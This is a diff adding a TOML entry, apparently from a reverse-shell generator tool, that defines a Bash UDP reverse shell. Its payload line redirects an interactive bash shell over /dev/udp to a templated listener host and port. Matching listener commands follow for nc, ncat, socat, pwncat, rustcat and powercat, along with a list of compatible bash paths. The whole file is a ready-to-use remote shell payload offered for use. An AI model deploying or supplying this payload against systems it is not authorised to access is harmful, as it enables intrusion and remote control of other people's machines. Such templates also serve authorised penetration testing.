@@ -1,0 +1,26 @@
+id = "bash_udp"
+name = "Bash UDP"
+os = "unix"
+type = "reverse"
+proto = "udp"
+lang = "bash"
+description = "Spawns an interactive bash shell and redirects IO over a UDP connection to the specified host and port."
+
+payload = "{{SHELL}} -i >& /dev/udp/{{LHOST}}/{{LPORT}} 0>&1"
+
+[listeners]
+nc = "nc -luvnp {{LPORT}}"
+nc_freebsd = "nc -luvn {{LPORT}}"
+busybox_nc = "busybox nc -ulp {{LPORT}}"
+ncat = "ncat -luvnp {{LPORT}}"
+ncat_exe = "ncat.exe -luvnp {{LPORT}}"
+rlwrap_nc = "rlwrap -cAr nc -luvnp {{LPORT}}"
+rustcat = "rcat listen -u {{LPORT}}"
+pwncat = "python3 -m pwncat -ulp {{LPORT}}"
+socat = "socat -d -d UDP-LISTEN:{{LPORT}} STDOUT"
+socat_tty = "socat -d -d file:`tty`,raw,echo=0 UDP-LISTEN:{{LPORT}}"
+powercat = "powercat -l -p {{LPORT}} -u"
+
+[shells]
+compatible = ["/usr/bin/env bash", "bash", "/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash", "/opt/homebrew/bin/bash", "/opt/local/bin/bash", "/snap/bin/bash", "/usr/sbin/bash", "/sbin/bash", "env bash"]
+default = "bash"
